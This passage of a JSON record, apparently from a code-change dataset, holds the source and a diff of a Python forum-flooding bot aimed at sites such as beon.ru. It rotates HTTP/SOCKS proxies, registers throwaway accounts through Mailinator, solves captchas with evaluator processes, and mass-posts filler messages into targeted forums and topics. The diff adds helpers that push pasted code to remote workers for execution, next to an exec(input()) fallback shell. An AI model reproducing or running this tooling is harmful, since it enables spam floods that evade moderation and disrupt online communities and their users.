**self.call[2])\n                self.child(self)\n            except WorkerInterrupt as e:\n                self.log.warn(e)\n            except Exception as e:\n                self.log.exception(e)\n            self.log.info('Terminating')\n        else:\n            self.log.info('Aborted')\n        self.running.set() # wz_multiwait needs this to avoid another state check.\n        self.unbind_methods()\n        self.running.clear()\n        self.wz_sock.close()\n        self.sig_sock.close()\n    \n    def term(self):\n        self.running.clear()\n\n\nclass WZWorkerThread(WZWorkerBase, threading.Thread):\n    def start(self, ctx, sig_addr, *args, **kvargs):\n        self.ctx = ctx\n        self.sig_addr = sig_addr\n        threading.Thread.start(self, *args, **kvargs)\n\nclass WZWorkerProcess(WZWorkerBase, multiprocessing.Process):\n    def start(self, sig_addr, *args, **kvargs):\n        self.sig_addr = sig_addr\n        multiprocessing.Process.start(self, *args, **kvargs)\n    \n    def __sinit__(self):\n        self.ctx = zmq.Context()\n        super().__sinit__()\n"}, "/unistart.py": {"changes": [{"diff": "\n             'forums': forums,\n             'domains': domains,\n             'sets': self.pc.sets,\n-            }\n+        }\n         with open(self.targetsfile, 'wb') as f:\n             f.write(pickle.dumps(data, pickle.HIGHEST_PROTOCOL))\n \n", "add": 1, "remove": 1, "filename": "/unistart.py", "badparts": ["            }"], "goodparts": ["        }"]}, {"diff": "\n     msg.extend(wzrpc.make_sig_msg(b'WipeManager', b'passthrough', frames))\n     sig_sock.send_multipart(msg)\n \n+def get_pasted_lines(sentinel):\n+    'Yield pasted lines until the user enters the given sentinel value.'\n+    print(\"Pasting code; enter '{0}' alone on the line to stop.\".format(sentinel))\n+    while True:\n+        l = input(':')\n+        if l == sentinel:\n+            return\n+        else:\n+            yield l\n+\n+def send_execute_to_wm(code):\n+    msg = [b'WipeManager']\n+    msg.extend((b'WZWorker', b'execute', code))\n+    send_to_wm(msg)\n+\n+def send_execute_to_ev(code):\n+    msg = [b'EVProxy']\n+    msg.extend((b'WZWorker', b'execute', code))\n+    send_passthrough(msg)\n+\n+def send_execute(name, code):\n+    msg = [name.encode('utf-8')]\n+    msg.extend((b'WZWorker', b'execute', code))\n+    send_passthrough(msg)\n+\n+def pexecute_in(name):\n+    send_execute(name, '\\n'.join(get_pasted_lines('--')).encode('utf-8'))\n+\n+def pexecute_in_wm():\n+    send_execute_to_wm('\\n'.join(get_pasted_lines('--')).encode('utf-8'))\n+\n+def pexecute_in_ev():\n+    send_execute_to_ev('\\n'.join(get_pasted_lines('--')).encode('utf-8'))\n+\n def drop_users():\n     send_passthrough([b'WipeSkel', b'WipeSkel', b'drop-user'])\n \n def log_spawn_name():\n     send_passthrough([b'WipeThread', b'WipeThread', b'log-spawn-name'])\n \n-if c.no_shell:\n-    while True:\n-        time.sleep(1)\n-else:\n-    try:\n-        import IPython\n+try:\n+    import IPython\n+    if c.no_shell:\n+        IPython.embed_kernel()\n+    else:\n         IPython.embed()\n-    except ImportError:\n-        # fallback shell\n+except ImportError:\n+    # fallback shell\n+    if c.no_shell:\n+        while True:\n+            time.sleep(1)\n+    else:\n         while True:\n             try:\n                 exec(input('>", "add": 45, "remove": 8, "filename": "/unistart.py", "badparts": ["if c.no_shell:", "    while True:", "        time.sleep(1)", "else:", "    try:", "        import IPython", "    except ImportError:"], "goodparts": ["def get_pasted_lines(sentinel):", "    'Yield pasted lines until the user enters the given sentinel value.'", "    print(\"Pasting code; enter '{0}' alone on the line to stop.\".format(sentinel))", "    while True:", "        l = input(':')", "        if l == sentinel:", "            return", "        else:", "            yield l", "def send_execute_to_wm(code):", "    msg = [b'WipeManager']", "    msg.extend((b'WZWorker', b'execute', code))", "    send_to_wm(msg)", "def send_execute_to_ev(code):", "    msg = [b'EVProxy']", "    msg.extend((b'WZWorker', b'execute', code))", "    send_passthrough(msg)", "def send_execute(name, code):", "    msg = [name.encode('utf-8')]", "    msg.extend((b'WZWorker', b'execute', code))", "    send_passthrough(msg)", "def pexecute_in(name):", "    send_execute(name, '\\n'.join(get_pasted_lines('--')).encode('utf-8'))", "def pexecute_in_wm():", "    send_execute_to_wm('\\n'.join(get_pasted_lines('--')).encode('utf-8'))", "def pexecute_in_ev():", "    send_execute_to_ev('\\n'.join(get_pasted_lines('--')).encode('utf-8'))", "try:", "    import IPython", "    if c.no_shell:", "        IPython.embed_kernel()", "    else:", "except ImportError:", "    if c.no_shell:", "        while True:", "            time.sleep(1)", "    else:"]}], "source": "\n import sys if 'lib' not in sys.path: sys.path.append('lib') import os, signal, logging, threading, re, traceback, time import random import zmq from queue import Queue import sup import wzworkers as workers from dataloader import DataLoader from uniwipe import UniWipe from wipeskel import * import wzrpc from beon import regexp import pickle from logging import config from logconfig import logging_config config.dictConfig(logging_config) logger=logging.getLogger() ctx=zmq.Context() sig_addr='ipc://signals' sig_sock=ctx.socket(zmq.PUB) sig_sock.bind(sig_addr) domains=set() targets=dict() protected=set() forums=dict() def message(): msg=[] msg.append('[image-original-none-http://simg4.gelbooru.com/' +'/images/db/1d/db1dfb62a40f5ced2043bb8966da9a98.png]') msg.append('\u041a\u0430\u0436\u0434\u044b\u0439 \u0445\u043e\u0447\u0435\u0442 \u0434\u0440\u0443\u0436\u0438\u0442\u044c \u0441 \u044f\u0434\u0435\u0440\u043d\u043e\u0439 \u0431\u043e\u043c\u0431\u043e\u0439.') msg.append(str(random.randint(0, 9999999999))) return '\\n'.join(msg) def sbjfun(): return sup.randstr(1, 30) import argparse parser=argparse.ArgumentParser(add_help=True) parser.add_argument('--only-cache', '-C', action='store_true', help=\"Disables any requests in DataLoader(includes Witch)\") parser.add_argument('--no-shell', '-N', action='store_true', help=\"Sleep instead of starting the shell\") parser.add_argument('--tcount', '-t', type=int, default=10, help='WipeThread count') parser.add_argument('--ecount', '-e', type=int, default=0, help='EvaluatorProxy count') parser.add_argument('--upload-avatar', action='store_true', default=False, help='Upload random avatar after registration') parser.add_argument('--av-dir', default='randav', help='Directory with avatars') parser.add_argument('--rp-timeout', '-T', type=int, default=10, help='Default rp timeout in seconds') parser.add_argument('--conlimit', type=int, default=3, help='http_request conlimit') parser.add_argument('--noproxy-timeout', type=int, default=5, help='noproxy_rp timeout') parser.add_argument('--caprate_minp', type=int, default=5, help='Cap rate minimum possible count for limit check') parser.add_argument('--caprate_limit', type=float, default=0.8, help='Captcha rate limit') parser.add_argument('--comment_successtimeout', type=float, default=0.8, help='Comment success timeout') parser.add_argument('--topic_successtimeout', type=float, default=0.1, help='Topic success timeout') parser.add_argument('--errortimeout', type=float, default=3, help='Error timeout') parser.add_argument('--stop-on-closed', action='store_true', default=False, help='Forget about closed topics') parser.add_argument('--die-on-neterror', action='store_true', default=False, help='Terminate spawn in case of too many NetErrors') c=parser.parse_args() noproxy_rp=sup.net.RequestPerformer() noproxy_rp.proxy='' noproxy_rp.timeout=c.noproxy_timeout noproxy_rp.timeout=c.rp_timeout d=DataLoader(noproxy_rp, c.only_cache) c.router_addr=d.addrs['rpcrouter'] noproxy_rp.useragent=random.choice(d.ua_list) def terminate(): logger.info('Shutdown initiated') send_to_wm([b'GLOBAL', b'WZWorker', b'terminate']) for t in threading.enumerate(): if isinstance(t, threading.Timer): t.cancel() logger.info('Exiting') def interrupt_handler(signal, frame): pass def terminate_handler(signal, frame): terminate() signal.signal(signal.SIGINT, interrupt_handler) signal.signal(signal.SIGTERM, terminate_handler) def make_net(proxy, proxytype): net=sup.net.RequestPerformer() net.proxy=proxy if proxytype=='HTTP' or proxytype=='HTTPS': net.proxy_type=sup.proxytype.http elif proxytype=='SOCKS4': net.proxy_type=sup.proxytype.socks4 elif proxytype=='SOCKS5': net.proxy_type=sup.proxytype.socks5 else: raise TypeError('Invalid proxytype %s' % proxytype) net.useragent=random.choice(d.ua_list) net.timeout=c.rp_timeout return net def upload_avatar(self, ud): if('avatar_uploaded' in ud[0] and ud[0]['avatar_uploaded'] is True): return files=[] for sd in os.walk(c.av_dir): files.extend(sd[2]) av=os.path.join(sd[0], random.choice(files)) self.log.info('Uploading %s as new avatar', av) self.site.uploadavatar('0', av) ud[0]['avatar']=av ud[0]['avatar_uploaded']=True from lib.mailinator import Mailinator def create_spawn(proxy, proxytype, pc, uq=None): for domain in domains: if domain in targets: tlist=targets[domain] else: tlist=list() targets[domain]=tlist if domain in forums: fset=forums[domain] else: fset=set() forums[domain]=fset net=make_net(proxy, proxytype) net.cookiefname=(proxy if proxy else 'noproxy')+'_'+domain w=UniWipe(fset, tlist, sbjfun, message, pc, net, domain, Mailinator, uq(domain) if uq else None) w.stoponclose=c.stop_on_closed w.die_on_neterror=c.die_on_neterror w.caprate_minp=c.caprate_minp w.caprate_limit=c.caprate_limit w.conlimit=c.conlimit w.comment_successtimeout=0.2 if c.upload_avatar: w.hooks['post_login'].append(upload_avatar) yield w class WipeManager: def __init__(self, config, *args, **kvargs): super().__init__(*args, **kvargs) self.newproxyfile='newproxies.txt' self.proxylist=set() self.c=config self.threads=[] self.processes=[] self.th_sa='inproc://wm-wth.sock' self.th_ba='inproc://wm-back.sock' self.pr_sa='ipc://wm-wpr.sock' self.pr_ba='ipc://wm-back.sock' self.userqueues={} self.usersfile='wm_users.pickle' self.targetsfile='wm_targets.pickle' self.bumplimitfile='wm_bumplimit.pickle' def init_th_sock(self): self.log.info( 'Initializing intraprocess signal socket %s', self.th_sa) self.th_sock=self.p.ctx.socket(zmq.PUB) self.th_sock.bind(self.th_sa) def init_th_back_sock(self): self.log.info( 'Initializing intraprocess backward socket %s', self.th_ba) self.th_back_sock=self.p.ctx.socket(zmq.ROUTER) self.th_back_sock.bind(self.th_ba) def init_pr_sock(self): self.log.info( 'Initializing interprocess signal socket %s', self.pr_sa) self.pr_sock=self.p.ctx.socket(zmq.PUB) self.pr_sock.bind(self.pr_sa) def init_pr_back_sock(self): self.log.info( 'Initializing interprocess backward socket %s', self.pr_ba) self.pr_back_sock=self.p.ctx.socket(zmq.ROUTER) self.pr_back_sock.bind(self.pr_ba) def read_newproxies(self): if not os.path.isfile(self.newproxyfile): return newproxies=set() with open(self.newproxyfile, 'rt') as f: for line in f: try: line=line.rstrip('\\n') proxypair=tuple(line.split(' ')) if len(proxypair) < 2: self.log.warning('Line %s has too few spaces', line) continue if len(proxypair) > 2: self.log.debug('Line %s has too much spaces', line) proxypair=(proxypair[0], proxypair[1]) newproxies.add(proxypair) except Exception as e: self.log.exception('Line %s raised exception %s', line, e) return newproxies.difference(self.proxylist) def add_spawns(self, proxypairs): while self.running.is_set(): try: try: proxypair=proxypairs.pop() except Exception: return self.proxylist.add(proxypair) for spawn in create_spawn(proxypair[0], proxypair[1], self.pc, self.get_userqueue): self.log.info('Created spawn %s', spawn.name) self.spawnqueue.put(spawn, False) except Exception as e: self.log.exception('Exception \"%s\" raised on create_spawn', e) def spawn_workers(self, wclass, count, args=(), kvargs={}): wname=str(wclass.__name__) self.log.info('Starting %s(s)', wname) if issubclass(wclass, workers.WZWorkerThread): type_=0 if not hasattr(self, 'th_sock'): self.init_th_sock() if not hasattr(self, 'th_back_sock'): self.init_th_back_sock() elif issubclass(wclass, workers.WZWorkerProcess): type_=1 if not hasattr(self, 'pr_sock'): self.init_pr_sock() if not hasattr(self, 'pr_back_sock'): self.init_pr_back_sock() else: raise Exception('Unknown wclass type') for i in range(count): if not self.running.is_set(): break try: w=wclass(*args, name='.'.join( (wname,('pr{0}' if type_ else 'th{0}').format(i))), **kvargs) if type_==0: self.threads.append(w) w.start(self.p.ctx, self.th_sa) elif type_==1: self.processes.append(w) w.start(self.pr_sa) except Exception as e: self.log.exception('Exception \"%s\" raised on %s spawn', e, wname) def spawn_nworkers(self, type_, fun, count, args=(), kvargs={}): wname=str(fun.__name__) self.log.info('Starting %s(s)', wname) if type_==0: if not hasattr(self, 'th_sock'): self.init_th_sock() if not hasattr(self, 'th_back_sock'): self.init_th_back_sock() elif type_==1: if not hasattr(self, 'pr_sock'): self.init_pr_sock() if not hasattr(self, 'pr_back_sock'): self.init_pr_back_sock() else: raise Exception('Unknown wclass type') for i in range(count): if not self.running.is_set(): break try: if type_==0: w=workers.WZWorkerThread( self.c.router_addr, fun, args, kvargs, name='.'.join((wname, 'th{0}'.format(i)))) self.threads.append(w) w.start(self.p.ctx, self.th_sa) elif type_==1: w=workers.WZWorkerProcess(self.c.router_addr, fun, args, kvargs, name='.'.join((wname, 'pr{0}'.format(i)))) self.processes.append(w) w.start(self.pr_sa) except Exception as e: self.log.exception('Exception \"%s\" raised on %s spawn', e, wname) def spawn_wipethreads(self): return self.spawn_nworkers(0, WipeThread, self.c.tcount, (self.pc, self.spawnqueue)) def spawn_evaluators(self): self.log.info('Initializing Evaluator') from evproxy import EvaluatorProxy def ev_init(): from lib.evaluators.PyQt4Evaluator import Evaluator return Evaluator() return self.spawn_nworkers(1, EvaluatorProxy, self.c.ecount, (ev_init,)) def load_users(self): if not os.path.isfile(self.usersfile): return with open(self.usersfile, 'rb') as f: users=pickle.loads(f.read()) try: for domain in users.keys(): uq=Queue() for ud in users[domain]: self.log.debug('Loaded user %s:%s', domain, ud['login']) uq.put(ud) self.userqueues[domain]=uq except Exception as e: self.log.exception(e) self.log.error('Failed to load users') def save_users(self): users={} for d, uq in self.userqueues.items(): uqsize=uq.qsize() uds=[] for i in range(uqsize): uds.append(uq.get(False)) users[d]=uds with open(self.usersfile, 'wb') as f: f.write(pickle.dumps(users, pickle.HIGHEST_PROTOCOL)) self.log.info('Saved users') def get_userqueue(self, domain): try: uq=self.userqueues[domain] except KeyError: self.log.info('Created userqueue for %s', domain) uq=Queue() self.userqueues[domain]=uq return uq def load_targets(self): fname=self.targetsfile if not os.path.isfile(fname): return with open(fname, 'rb') as f: data=pickle.loads(f.read()) if 'targets' in data: self.log.debug('Target list was loaded') targets.update(data['targets']) if 'forums' in data: self.log.debug('Forum set was loaded') forums.update(data['forums']) if 'domains' in data: self.log.debug('Domain set was loaded') domains.update(data['domains']) if 'sets' in data: self.log.debug('Other sets were loaded') self.pc.sets.update(data['sets']) def load_bumplimit_set(self): if not os.path.isfile(self.bumplimitfile): return with open(self.bumplimitfile, 'rb') as f: self.pc.sets['bumplimit'].update(pickle.loads(f.read())) def save_targets(self): data={ 'targets': targets, 'forums': forums, 'domains': domains, 'sets': self.pc.sets, } with open(self.targetsfile, 'wb') as f: f.write(pickle.dumps(data, pickle.HIGHEST_PROTOCOL)) def targets_from_witch(self): for t in d.witch_targets: if t['domain']=='beon.ru' and t['forum']=='anonymous': try: add_target_exc(t['id'], t['user']) except ValueError: pass def terminate(self): msg=[b'GLOBAL'] msg.extend(wzrpc.make_sig_msg(b'WZWorker', b'terminate',[])) if hasattr(self, 'th_sock'): self.th_sock.send_multipart(msg) if hasattr(self, 'pr_sock'): self.pr_sock.send_multipart(msg) def join_threads(self): for t in self.threads: t.join() def send_passthrough(self, interface, method, frames): msg=[frames[0]] msg.extend(wzrpc.make_sig_msg(frames[1], frames[2], frames[3:])) self.th_sock.send_multipart(msg) self.pr_sock.send_multipart(msg) def __call__(self, parent): self.p=parent self.log=parent.log self.inter_sleep=parent.inter_sleep self.running=parent.running self.p.sig_sock.setsockopt(zmq.SUBSCRIBE, b'WipeManager') self.p.wz.set_sig_handler(b'WipeManager', b'passthrough', self.send_passthrough) if self.c.tcount > 0: self.pc=ProcessContext(self.p.name, self.p.ctx, self.c.router_addr, noproxy_rp) self.spawnqueue=Queue() self.load_bumplimit_set() self.load_targets() self.load_users() self.spawn_wipethreads() if self.c.ecount > 0: self.spawn_evaluators() try: while self.running.is_set(): if self.c.tcount==0: self.inter_sleep(5) continue self.pc.check_waiting() new=self.read_newproxies() if not new: self.inter_sleep(5) continue self.add_spawns(new) except WorkerInterrupt: pass except Exception as e: self.log.exception(e) self.terminate() self.join_threads() if self.c.tcount > 0: self.save_users() self.save_targets() wm=workers.WZWorkerThread(c.router_addr, WipeManager,(c,), name='SpaghettiMonster') wm.start(ctx, sig_addr) def add_target(domain, id_, tuser=None): if domain not in targets: targets[domain]=[] tlist=targets[domain] id_=str(id_) tuser=tuser or '' t=(tuser, id_) logger.info('Appending %s to targets[%s]', repr(t), domain) tlist.append(t) def remove_target(domain, id_, tuser=None): tlist=targets[domain] id_=str(id_) tuser=tuser or '' t=(tuser, id_) logger.info('Removing %s from targets[%s]', repr(t), domain) tlist.remove(t) def add_target_exc(domain, id_, tuser=None): if domain not in targets: targets[domain]=[] tlist=targets[domain] id_=str(id_) tuser=tuser or '' t=(tuser, id_) if t in protected: raise ValueError('%s is protected' % repr(t)) if t not in tlist: logger.info('Appending %s to targets[%s]', repr(t), domain) tlist.append(t) r_di=re.compile(regexp.f_udi) def atfu(urls): for user, domain, id1, id2 in r_di.findall(urls): id_=id1+id2 add_target(domain, id_, user) def rtfu(urls): for user, domain, id1, id2 in r_di.findall(urls): id_=id1+id2 remove_target(domain, id_, user) def get_forum_id(name): id_=d.bm_id_forum.get_key(name) int(id_, 10) return id_ r_udf=re.compile(regexp.udf_prefix) def affu(urls): for user, domain, forum in r_udf.findall(urls): if domain not in forums: forums[domain]=set() if len(forum) > 0: get_forum_id(forum) logger.info('Appending %s:%s to forums[%s]', user, forum, domain) forums[domain].add((user, forum)) def rffu(urls): for user, domain, forum in r_udf.findall(urls): if len(forum) > 0: get_forum_id(forum) logger.info('Removing %s:%s from forums[%s]', user, forum, domain) forums[domain].remove((user, forum)) def add_user(domain, login, passwd): uq=wm.get_userqueue(domain) uq.put({'login': login, 'passwd': passwd}, False) def send_to_wm(frames): msg=[frames[0]] msg.extend(wzrpc.make_sig_msg(frames[1], frames[2], frames[3:])) sig_sock.send_multipart(msg) def send_passthrough(frames): msg=[b'WipeManager'] msg.extend(wzrpc.make_sig_msg(b'WipeManager', b'passthrough', frames)) sig_sock.send_multipart(msg) def drop_users(): send_passthrough([b'WipeSkel', b'WipeSkel', b'drop-user']) def log_spawn_name(): send_passthrough([b'WipeThread', b'WipeThread', b'log-spawn-name']) if c.no_shell: while True: time.sleep(1) else: try: import IPython IPython.embed() except ImportError: while True: try: exec(input('> ')) except KeyboardInterrupt: print(\"KeyboardInterrupt\") except SystemExit: break except: print(traceback.format_exc()) terminate() ", "sourceWithComments": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n# -*- mode: python -*-\nimport sys\nif 'lib' not in sys.path:\n    sys.path.append('lib')\nimport os, signal, logging, threading, re, traceback, time\nimport random\nimport zmq\nfrom queue import Queue\nimport sup\nimport wzworkers as workers\nfrom dataloader import DataLoader\nfrom uniwipe import UniWipe\nfrom wipeskel import *\nimport wzrpc\nfrom beon import regexp\nimport pickle\n\nfrom logging import config\nfrom logconfig import logging_config\nconfig.dictConfig(logging_config)\nlogger = logging.getLogger()\n\nctx = zmq.Context()\nsig_addr = 'ipc://signals'\nsig_sock = ctx.socket(zmq.PUB)\nsig_sock.bind(sig_addr)\n\n# Settings for you\ndomains = set() # d.witch_domains\ntargets = dict() # d.witch_targets\nprotected = set() # will be removed later\nforums = dict() # target forums\n\n# from lib import textgen\n# with open('data.txt', 'rt') as f:\n#     model = textgen.train(f.read())\n# def mesasge():\n#     while True:\n#         s = textgen.generate_sentence(model)\n#         try:\n#             s.encode('cp1251')\n#             break\n#         except Exception:\n#             continue\n#     return s\n\ndef message():\n    msg = []\n    # msg.append('[video-youtube-'+\n    #            random.choice(('3odl-KoNZwk', 'bu55q_3YtOY', '4YPiCeLwh5o',\n    #                           'eSBybJGZoCU', 'ZtWTUt2RZh0', 'VXa9tXcMhXQ',))\n    #            +']')\n    msg.append('[image-original-none-http://simg4.gelbooru.com/'\n               + '/images/db/1d/db1dfb62a40f5ced2043bb8966da9a98.png]')\n    msg.append('\u041a\u0430\u0436\u0434\u044b\u0439 \u0445\u043e\u0447\u0435\u0442 \u0434\u0440\u0443\u0436\u0438\u0442\u044c \u0441 \u044f\u0434\u0435\u0440\u043d\u043e\u0439 \u0431\u043e\u043c\u0431\u043e\u0439.')\n    # msg.append('[video-youtube-'+random.choice(\n    #     # ('WdDb_RId-xU', 'EFL1-fL-WtM', 'uAOoiIkFQq4',\n    #     #  'eZO3K_4yceU', '1c1lT_HgJNo', 'WOkvVVaJ2Ks',\n    #     #  'KYq90TEdxIE', 'rWBM2whL0bI', '0PDy_MKYo4A'))\n    #     #('GabBLLOT6vw', 'qgvOpSquCAY', 'zUe-z9DZBNo', '4fCbfDEKZss', 'uIE-JgmkmdM'))\n    #     ('42JQYPioVo4', 'jD6j072Ep1M', 'mPyF5ovoIVs', 'cEEi1BHycb0', 'PuA1Wf8nkxw',\n    #      'ASJ9qlsPgHU', 'DP1ZDW9_xOo', 'bgSqH9LT-mI', ))\n    # +']')\n    # http://simg2.gelbooru.com//images/626/58ca1c9a8ffcdedd0e2eb6f33c9389cb7588f0d1.jpg\n    # msg.append('Enjoy the view!')\n    msg.append(str(random.randint(0, 9999999999)))\n    return '\\n'.join(msg)\n\ndef sbjfun():\n    # return 'Out of the darkness we will rise, into the light we will dwell'\n    return sup.randstr(1, 30)\n\n# End\nimport argparse\n\nparser = argparse.ArgumentParser(add_help=True)\nparser.add_argument('--only-cache', '-C', action='store_true',\n    help=\"Disables any requests in DataLoader (includes Witch)\")\nparser.add_argument('--no-shell', '-N', action='store_true',\n    help=\"Sleep instead of starting the shell\")\nparser.add_argument('--tcount', '-t', type=int, default=10,\n    help='WipeThread count')\nparser.add_argument('--ecount', '-e', type=int, default=0,\n    help='EvaluatorProxy count')\nparser.add_argument('--upload-avatar', action='store_true', default=False,\n    help='Upload random avatar after registration')\nparser.add_argument('--av-dir', default='randav', help='Directory with avatars')\nparser.add_argument('--rp-timeout', '-T', type=int, default=10,\n    help='Default rp timeout in seconds')\nparser.add_argument('--conlimit', type=int, default=3,\n    help='http_request conlimit')\nparser.add_argument('--noproxy-timeout', type=int, default=5,\n    help='noproxy_rp timeout')\n\nparser.add_argument('--caprate_minp', type=int, default=5,\n    help='Cap rate minimum possible count for limit check')\nparser.add_argument('--caprate_limit', type=float, default=0.8,\n    help='Captcha rate limit')\n\nparser.add_argument('--comment_successtimeout', type=float, default=0.8,\n    help='Comment success timeout')\nparser.add_argument('--topic_successtimeout', type=float, default=0.1,\n    help='Topic success timeout')\nparser.add_argument('--errortimeout', type=float, default=3,\n    help='Error timeout')\n\n\nparser.add_argument('--stop-on-closed', action='store_true', default=False,\n    help='Forget about closed topics')\nparser.add_argument('--die-on-neterror', action='store_true', default=False,\n    help='Terminate spawn in case of too many NetErrors')\n\nc = parser.parse_args()\n\n# rps = {}\n\nnoproxy_rp = sup.net.RequestPerformer()\nnoproxy_rp.proxy = ''\nnoproxy_rp.timeout = c.noproxy_timeout\nnoproxy_rp.timeout = c.rp_timeout\n\n# rps[''] = noproxy_rp\n\n# Achtung: DataLoader probably isn't thread-safe.\nd = DataLoader(noproxy_rp, c.only_cache)\nc.router_addr = d.addrs['rpcrouter']\nnoproxy_rp.useragent = random.choice(d.ua_list)\n\ndef terminate():\n    logger.info('Shutdown initiated')\n    # send_passthrough([b'GLOBAL', b'WZWorker', b'terminate'])\n    send_to_wm([b'GLOBAL', b'WZWorker', b'terminate'])\n    for t in threading.enumerate():\n        if isinstance(t, threading.Timer):\n            t.cancel()\n    # try:\n    #     wm.term()\n    #     wm.join()\n    # except: # WM instance is not created yet.\n    #     pass\n    logger.info('Exiting')\n\ndef interrupt_handler(signal, frame):\n    pass # Just do nothing\n\ndef terminate_handler(signal, frame):\n    terminate()\n\nsignal.signal(signal.SIGINT, interrupt_handler)\nsignal.signal(signal.SIGTERM, terminate_handler)\n\ndef make_net(proxy, proxytype):\n    # if proxy in rps:\n    #     return rps[proxy]\n    net = sup.net.RequestPerformer()\n    net.proxy = proxy\n    if proxytype == 'HTTP' or proxytype == 'HTTPS':\n        net.proxy_type = sup.proxytype.http\n    elif proxytype == 'SOCKS4':\n        net.proxy_type = sup.proxytype.socks4\n    elif proxytype == 'SOCKS5':\n        net.proxy_type = sup.proxytype.socks5\n    else:\n        raise TypeError('Invalid proxytype %s' % proxytype)\n    # rps[proxy] = net\n    net.useragent = random.choice(d.ua_list)\n    net.timeout = c.rp_timeout\n    return net\n\n# UniWipe patching start\ndef upload_avatar(self, ud):\n    if ('avatar_uploaded' in ud[0] and\n        ud[0]['avatar_uploaded'] is True):\n        return\n    files = []\n    for sd in os.walk(c.av_dir):\n        files.extend(sd[2])\n    av = os.path.join(sd[0], random.choice(files))\n    self.log.info('Uploading %s as new avatar', av)\n    self.site.uploadavatar('0', av)\n    ud[0]['avatar'] = av\n    ud[0]['avatar_uploaded'] = True\n\nfrom lib.mailinator import Mailinator\n# from lib.tempmail import TempMail as Mailinator\n\n# Move this to WipeManager\ndef create_spawn(proxy, proxytype, pc, uq=None):\n    for domain in domains:\n        if domain in targets:\n            tlist = targets[domain]\n        else:\n            tlist = list()\n            targets[domain] = tlist\n        if domain in forums:\n            fset = forums[domain]\n        else:\n            fset = set()\n            forums[domain] = fset\n        net = make_net(proxy, proxytype)\n        net.cookiefname = (proxy if proxy else 'noproxy')+'_'+domain\n        w = UniWipe(fset, tlist, sbjfun, message, pc, net, domain, Mailinator,\n            uq(domain) if uq else None)\n        w.stoponclose = c.stop_on_closed\n        w.die_on_neterror = c.die_on_neterror\n        w.caprate_minp = c.caprate_minp\n        w.caprate_limit = c.caprate_limit\n        w.conlimit = c.conlimit\n        w.comment_successtimeout = 0.2\n        if c.upload_avatar:\n            w.hooks['post_login'].append(upload_avatar)\n        yield w\n\n# UniWipe patching end\n\nclass WipeManager:\n    def __init__(self, config, *args, **kvargs):\n        super().__init__(*args, **kvargs)\n        self.newproxyfile = 'newproxies.txt'\n        self.proxylist = set()\n        self.c = config\n        self.threads = []\n        self.processes = []\n        self.th_sa = 'inproc://wm-wth.sock'\n        self.th_ba = 'inproc://wm-back.sock'\n        self.pr_sa = 'ipc://wm-wpr.sock'\n        self.pr_ba = 'ipc://wm-back.sock'\n        self.userqueues = {}\n        self.usersfile = 'wm_users.pickle'\n        self.targetsfile = 'wm_targets.pickle'\n        self.bumplimitfile = 'wm_bumplimit.pickle'\n\n    def init_th_sock(self):\n        self.log.info(\n            'Initializing intraprocess signal socket %s', self.th_sa)\n        self.th_sock = self.p.ctx.socket(zmq.PUB)\n        self.th_sock.bind(self.th_sa)\n\n    def init_th_back_sock(self):\n        self.log.info(\n            'Initializing intraprocess backward socket %s', self.th_ba)\n        self.th_back_sock = self.p.ctx.socket(zmq.ROUTER)\n        self.th_back_sock.bind(self.th_ba)\n\n    def init_pr_sock(self):\n        self.log.info(\n            'Initializing interprocess signal socket %s', self.pr_sa)\n        self.pr_sock = self.p.ctx.socket(zmq.PUB)\n        self.pr_sock.bind(self.pr_sa)\n\n    def init_pr_back_sock(self):\n        self.log.info(\n            'Initializing interprocess backward socket %s', self.pr_ba)\n        self.pr_back_sock = self.p.ctx.socket(zmq.ROUTER)\n        self.pr_back_sock.bind(self.pr_ba)\n\n    def read_newproxies(self):\n        if not os.path.isfile(self.newproxyfile):\n            return\n        newproxies = set()\n        with open(self.newproxyfile, 'rt') as f:\n            for line in f:\n                try:\n                    line = line.rstrip('\\n')\n                    proxypair = tuple(line.split(' '))\n                    if len(proxypair) < 2:\n                        self.log.warning('Line %s has too few spaces', line)\n                        continue\n                    if len(proxypair) > 2:\n                        self.log.debug('Line %s has too much spaces', line)\n                        proxypair = (proxypair[0], proxypair[1])\n                    newproxies.add(proxypair)\n                except Exception as e:\n                    self.log.exception('Line %s raised exception %s', line, e)\n        # os.unlink(self.newproxyfile)\n        return newproxies.difference(self.proxylist)\n\n    def add_spawns(self, proxypairs):\n        while self.running.is_set():\n            try:\n                try:\n                    proxypair = proxypairs.pop()\n                except Exception:\n                    return\n                self.proxylist.add(proxypair)\n                for spawn in create_spawn(proxypair[0], proxypair[1], self.pc,\n                        self.get_userqueue):\n                    self.log.info('Created spawn %s', spawn.name)\n                    self.spawnqueue.put(spawn, False)\n            except Exception as e:\n                self.log.exception('Exception \"%s\" raised on create_spawn', e)\n\n    def spawn_workers(self, wclass, count, args=(), kvargs={}):\n        wname = str(wclass.__name__)\n        self.log.info('Starting %s(s)', wname)\n        if issubclass(wclass, workers.WZWorkerThread):\n            type_ = 0\n            if not hasattr(self, 'th_sock'):\n                self.init_th_sock()\n            if not hasattr(self, 'th_back_sock'):\n                self.init_th_back_sock()\n        elif issubclass(wclass, workers.WZWorkerProcess):\n            type_ = 1\n            if not hasattr(self, 'pr_sock'):\n                self.init_pr_sock()\n            if not hasattr(self, 'pr_back_sock'):\n                self.init_pr_back_sock()\n        else:\n            raise Exception('Unknown wclass type')\n        for i in range(count):\n            if not self.running.is_set():\n                break\n            try:\n                w = wclass(*args, name='.'.join(\n                    (wname, ('pr{0}' if type_ else 'th{0}').format(i))),\n                    **kvargs)\n                if type_ == 0:\n                    self.threads.append(w)\n                    w.start(self.p.ctx, self.th_sa)\n                elif type_ == 1:\n                    self.processes.append(w)\n                    w.start(self.pr_sa)\n            except Exception as e:\n                self.log.exception('Exception \"%s\" raised on %s spawn',\n                                   e, wname)\n\n    def spawn_nworkers(self, type_, fun, count, args=(), kvargs={}):\n        wname = str(fun.__name__)\n        self.log.info('Starting %s(s)', wname)\n        if type_ == 0:\n            if not hasattr(self, 'th_sock'):\n                self.init_th_sock()\n            if not hasattr(self, 'th_back_sock'):\n                self.init_th_back_sock()\n        elif type_ == 1:\n            if not hasattr(self, 'pr_sock'):\n                self.init_pr_sock()\n            if not hasattr(self, 'pr_back_sock'):\n                self.init_pr_back_sock()\n        else:\n            raise Exception('Unknown wclass type')\n        for i in range(count):\n            if not self.running.is_set():\n                break\n            try:\n                if type_ == 0:\n                    w = workers.WZWorkerThread(\n                        self.c.router_addr, fun, args, kvargs,\n                        name='.'.join((wname, 'th{0}'.format(i))))\n                    self.threads.append(w)\n                    w.start(self.p.ctx, self.th_sa)\n                elif type_ == 